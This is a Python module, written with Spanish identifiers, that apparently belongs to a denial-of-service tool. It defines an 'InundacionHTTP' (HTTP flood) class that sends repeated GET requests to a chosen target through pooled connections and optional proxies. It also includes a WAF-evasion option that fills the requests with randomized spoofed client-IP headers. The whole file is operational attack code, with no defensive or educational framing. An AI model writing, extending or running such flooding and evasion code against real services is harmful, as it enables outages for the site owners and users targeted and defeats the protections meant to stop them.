import asyncio
import random
import aiohttp
from aiohttp import ClientSession, ClientTimeout, ClientError
from core.generador_paquetes import GeneradorPaquetes

class InundacionHTTP:
    def __init__(self, motor):
        self.motor = motor
        self.generador = GeneradorPaquetes(motor.tamano_payload)
        
    async def ejecutar(self, proxy=None):
        sesion = None
        try:
            sesion = await self.motor.pool.obtener_conexion(
                self.motor.host,
                self.motor.puerto,
                self.motor.ssl,
                proxy
            )
            
            if not sesion:
                return
                
            solicitud = self.generador.generar_solicitud_get(
                self.motor.host,
                "/",
                self._generar_cabeceras_extra() if self.motor.evadir_waf else None
            )
            
            url = f"{'https' if self.motor.ssl else 'http'}://{self.motor.host}:{self.motor.puerto}{solicitud['path']}"
            
            async with sesion.get(
                url,
                headers=solicitud['headers'],
                params=solicitud['params'],
                timeout=ClientTimeout(total=self.motor.timeout)
            ) as respuesta:
                await respuesta.read()
                self.motor.estadisticas.agregar_exito(len(solicitud['headers']) + len(str(solicitud['params'])))
                
        except (asyncio.CancelledError, ClientError, Exception):
            self.motor.estadisticas.agregar_error()
        finally:
            if sesion:
                await self.motor.pool.liberar_conexion(sesion)
            
    def _generar_cabeceras_extra(self):
        return {
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-Addr": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }